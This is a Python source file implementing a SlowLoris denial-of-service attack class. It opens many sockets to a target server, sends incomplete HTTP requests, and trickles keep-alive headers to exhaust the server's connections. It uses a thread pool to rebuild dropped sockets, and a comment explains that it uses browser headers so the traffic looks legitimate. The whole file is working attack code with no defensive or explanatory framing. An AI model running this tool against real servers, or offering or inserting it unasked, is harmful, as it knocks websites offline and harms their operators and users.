import socket

from time import sleep
from random import randint
from multiprocessing.pool import ThreadPool
from . import logger


class SlowLoris:
    # These are legit Firefox headers so the connections does not appear suspicious
    headers = [
        'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Accept-Language: en-US,en;q=0.5'
    ]

    def __init__(self, target, sock_count, thread_count=1):
        '''
        A SlowLoris attack class which handles creation and management of sockets with thread pool feature
        Arguments:
        - `target` , a (host, port) set specifying the destination
        - `sock_count` , the number of socket connections to make to the target
        - `thread_count` , the maximum number of threads in the thread pool
        '''
        self.sockets = []
        self._workers = []

        logger.info('Attacking {} with {} sockets'.format(target[0], sock_count))
        self._sock_count = sock_count
        self.target = target

        logger.info('Creating a thread pool of {} threads'.format(thread_count))
        self.pool = ThreadPool(thread_count)

    def connect_sockets(self):
        '''
        Creates the socket connections specified in `_sock_count` by adding the task to the queue and blocks until all sockets are created
        '''
        logger.info('Creating {} sockets'.format(self._sock_count))
        for _ in range(self._sock_count):
            # Addding the task to the thread pool queue
            self.pool.apply_async(self.init_socket)
        self.pool.close()
        self.pool.join()
        logger.info('Created {} sockets'.format(len(self.sockets)))
        if len(self.sockets) != self._sock_count:
            raise Exception('Unable to create {} sockets!'.format(self._sock_count))

    def init_socket(self):
        '''
        Creates a single socket to the target and stores the socket in the `sockets` list to be managed later
        '''
        try:
            # Create and connect the socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect(self.target)

            # Send the headers of the HTTP request
            sock.send('GET /?{} HTTP/1.1\r\n'.format(randint(0, 50000)).encode('utf-8'))
            for header in self.headers:
                sock.send('{}\r\n'.format(header).encode('utf-8'))

            # Note: a CLRF is not sent to maintain the connection
            logger.debug('Connection established for {} on port {}'.format(self.target[0], self.target[1]))
            if sock:
                # Appending the lists of sockets
                self.sockets.append(sock)
        except socket.error:
            # Unable to establish connection, return gracefully
            logger.debug('Losing connection at {} sockets'.format(len(self.sockets)))
            return

    def __enter__(self):
        '''
        To enable the `with ... as ...` construction of this class
        '''
        return self

    def __exit__(self, *args):
        '''
        Closing the socket connections for garbage collection
        '''
        for sock in self.sockets:
            sock.close()
        self.pool.terminate()

    def keep_alive(self):
        '''
        Slowly sending data to the server to maintain a connection and starve it's resources
        '''
        for sock in self.sockets:
            try:
                sock.send('X-a: {}\r\n'.format(randint(1, 50000)).encode('utf-8'))
            except socket.error:
                self.sockets.remove(sock)
        for _ in range(self._sock_count - len(self.sockets)):
            logger.debug('Recreating socket...')
            self.init_socket()
        sleep(15)
